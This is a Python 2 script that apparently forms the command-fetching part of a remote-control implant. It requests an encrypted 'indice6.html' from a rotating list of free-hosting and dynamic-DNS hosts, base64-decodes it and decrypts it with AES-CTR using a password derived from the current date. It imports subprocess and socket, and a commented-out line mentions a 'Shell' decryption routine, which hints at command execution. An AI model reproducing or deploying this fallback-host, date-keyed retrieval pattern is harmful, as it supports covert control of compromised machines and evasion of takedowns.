from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
import base64
import tempfile
import time
import sys
import requests
import subprocess
import socket


def derive_key_and_iv(password, salt, key_length, iv_length):
    d = d_i = ''
    while len(d) < key_length + iv_length:
        d_i = md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_length], d[key_length:key_length+iv_length]


def deBase64(inf,outf):
    inf=open(inf,"r")
    outf=open(outf,"wb")
    for l in inf:
        outf.write(base64.b64decode(l))
    outf.close()
    inf.close()

def decryptCTR(in_file="/tmp/indice6.html", out_file=None, 
               password="clave"+time.strftime("%Y-%m-%d"), key_length=32,
               base64=True,padding=False):
    if (base64):
        tmpFile=tempfile.mktemp()
        deBase64(in_file,tmpFile)
        in_file=tmpFile
    in_file=open(in_file,"rb")
    if (out_file==None):
        out_file=sys.stdout
    else:
        out_file=open(out_file,"w")
    bs = AES.block_size
    salt = in_file.read(bs)[len('Salted__'):]
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    #print "key: "+key.encode("hex")
    #print "iv: "+iv.encode("hex")
    #sys.exit(0)
    ctr=Counter.new(bs*8,initial_value=long(iv.encode("hex"),16))
    cipher = AES.new(key, AES.MODE_CTR, counter = ctr)
    next_chunk = ''
    finished = False
    while not finished:
        chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1 * bs))
        if len(next_chunk) == 0:
            if (padding):
                padding_length = ord(chunk[-1])
                chunk = chunk[:-padding_length]
            finished = True
        out_file.write(chunk)
    in_file.close()
    if (out_file!=sys.stdout):
       out_file.close()

def obtenerFicheroIndice(urls=None):
    indice="indice6.html"
    if (urls==None):
        urls=["https://ganimedes.000webhostapp.com/","http://scratch.hol.es/","http://xyz.hit.to/",
          "http://ubuin.hopto.org/","http://ganimedes.esy.es/"]
    for url in urls:
        try: 
            r=requests.get(url+indice);  
            break
        except: r=None
            
    if (r==None or r.status_code!=200):
        return "Error"
    outfile = tempfile.mktemp()
    out=open(outfile,"w")
    out.write(r.content)
    out.close()
    #return encryptDecryptCtr256Shell(r.content,"clave"+time.strftime("%Y-%m-%d"),'d',hostname())
    return decryptCTR(outfile)
